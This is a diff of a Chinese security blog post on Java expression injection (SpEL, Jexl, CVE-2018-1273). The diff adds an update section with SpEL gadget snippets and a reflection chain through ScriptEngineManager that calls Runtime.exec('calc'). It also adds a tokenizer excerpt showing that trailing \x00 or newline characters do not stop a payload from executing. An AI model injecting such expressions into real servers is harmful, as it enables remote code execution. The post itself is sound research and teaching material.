@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    2.8k 字
+                    3k 字
                   </span>
                 
 
@@ -134,7 +134,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      11 分钟
+                      13 分钟
                   </span>
                 
 
@@ -162,7 +162,7 @@
           <div class="post-content mx-auto" id="post">
             
             <div class="markdown-body">
-              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看 Java 相关的漏洞有一段时间了，觉得 Java 特色的很多漏洞和知识点都相当有趣，比如反序列化、JNDI 注入、JRMP 等等，最近翻文章的时候看到了 Spring-data-commons(CVE-2018-1273) 这个漏洞，看到了 Spring 框架特色的 Spel 表达式注入，想起来以前写了一半差一步的 <a href="https://aluvion.github.io/2019/03/04/Nexus-Repository-Manager-3-CVE-2019-7238-IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" target="_blank" rel="noopener"><strong>Nexus Repository Manager 3 CVE-2019-7238(Jexl表达式)</strong> </a>，还想到了以前做过的 ph 牛的 code-breaking ，以及 nuxeo rce ，正好写一起总结一番。</p>
+              <h3 id="前言-2020-05-04更新"><a href="#前言-2020-05-04更新" class="headerlink" title="前言(2020/05/04更新)"></a>前言(2020/05/04更新)</h3><p>看 Java 相关的漏洞有一段时间了，觉得 Java 特色的很多漏洞和知识点都相当有趣，比如反序列化、JNDI 注入、JRMP 等等，最近翻文章的时候看到了 Spring-data-commons(CVE-2018-1273) 这个漏洞，看到了 Spring 框架特色的 Spel 表达式注入，想起来以前写了一半差一步的 <a href="https://aluvion.github.io/2019/03/04/Nexus-Repository-Manager-3-CVE-2019-7238-IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" target="_blank" rel="noopener"><strong>Nexus Repository Manager 3 CVE-2019-7238(Jexl表达式)</strong> </a>，还想到了以前做过的 ph 牛的 code-breaking ，以及 nuxeo rce ，正好写一起总结一番。</p>
 <a id="more"></a>
 <h3 id="为什么会有这种漏洞"><a href="#为什么会有这种漏洞" class="headerlink" title="为什么会有这种漏洞"></a>为什么会有这种漏洞</h3><p>因为服务端没有对我们的输入进行过滤就直接进行表达式的解析和执行，所以我们得以恶意的表达式注入到了服务端进行执行。</p>
 <h3 id="Java-表达式"><a href="#Java-表达式" class="headerlink" title="Java 表达式"></a>Java 表达式</h3><p>众所周知，语言的安全性和它的简便性往往是成反比的，比如全世界最好的语言 PHP，在方便了开发的同时也诞生了很多的“黑魔法”。Java 表达式就是为了方便开发者进行开发而诞生的一种工具，开发者使用 Java 表达式，可以方便地进行运算，并动态赋值。</p>
@@ -318,6 +318,46 @@ session[&#39;class&#39;]
 <pre><code class="java">#{&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15].invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7].invoke(null),&#39;calc.exe&#39;)}
 </code></pre>
 <hr>
+<h3 id="2020-05-04-更新"><a href="#2020-05-04-更新" class="headerlink" title="2020/05/04 更新"></a>2020/05/04 更新</h3><h4 id="获取基本类"><a href="#获取基本类" class="headerlink" title="获取基本类"></a>获取基本类</h4><pre><code>T(java.lang.Runtime)
+new String(&quot;&quot;)
+#this
+&quot;&quot;.getClass()
+&quot;&quot;.class
+</code></pre><h4 id="获取函数"><a href="#获取函数" class="headerlink" title="获取函数"></a>获取函数</h4><pre><code>getMethod
+getMethods()[0]
+</code></pre><h4 id="通过反射获取类构造函数"><a href="#通过反射获取类构造函数" class="headerlink" title="通过反射获取类构造函数"></a>通过反射获取类构造函数</h4><pre><code>&quot;&quot;.class.class.getMethod(&quot;newInstance&quot;).invoke(&quot;&quot;.class.forName(&quot;javax.script.ScriptEngineManager&quot;)).getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#39;calc&#39;)&quot;)
+</code></pre><h4 id="Spel-表达式-token-解析中的字符略过"><a href="#Spel-表达式-token-解析中的字符略过" class="headerlink" title="Spel 表达式 token 解析中的字符略过"></a>Spel 表达式 token 解析中的字符略过</h4><pre><code class="java">while (this.pos &lt; this.max) {
+    char ch = this.charsToProcess[this.pos];
+    if (isAlphabetic(ch)) {
+        lexIdentifier();
+    }
+    else {
+        switch (ch) {
+            ...
+            case &#39; &#39;:
+            case &#39;\t&#39;:
+            case &#39;\r&#39;:
+            case &#39;\n&#39;:
+                // drift over white space
+                this.pos++;
+                break;
+            ...
+            case 0:
+                // hit sentinel at end of value
+                this.pos++;  // will take us to the end
+                break;
+            case &#39;\\&#39;:
+                raiseParseException(this.pos, SpelMessage.UNEXPECTED_ESCAPE_CHAR);
+                break;
+            default:
+                throw new IllegalStateException(&quot;Cannot handle (&quot; + (int) ch + &quot;) &#39;&quot; + ch + &quot;&#39;&quot;);
+        }
+    }
+}
+</code></pre>
+<p>可以在一个完整的 spel 表达式部分后面加上 \x00、\n 等等字符，不会影响表达式的执行。</p>
+<p>一个完整的部分是什么，可以阅读源码或者自行调试。</p>
+<hr>
 <p>参考文章：</p>
 <p><a href="https://xz.aliyun.com/t/2269" target="_blank" rel="noopener">https://xz.aliyun.com/t/2269</a></p>
 <p><a href="http://blog.nsfocus.net/cve-2018-1273-analysis/" target="_blank" rel="noopener">http://blog.nsfocus.net/cve-2018-1273-analysis/</a></p>
@@ -335,9 +375,9 @@ session[&#39;class&#39;]
                   <span>
                 <i class="iconfont icon-tag"></i>
                     
-                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
-                    
                       <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
                     
                       <a class="hover-with-bg" href="/tags/复现/">复现</a>
                     
